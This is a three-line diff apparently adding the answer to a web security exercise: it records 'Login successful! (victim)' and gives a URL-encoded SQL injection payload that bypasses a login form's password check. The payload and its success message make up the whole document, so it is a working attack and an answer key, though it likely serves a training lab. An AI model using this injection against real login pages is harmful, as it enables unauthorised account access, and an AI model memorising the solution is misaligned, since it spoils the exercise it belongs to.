@@ -1,0 +1,3 @@
+Login successful! (victim)
+Submit the following line as your solution:
+username=victim&password=%5C%27%20OR%20%221%22%3D%221%22%23
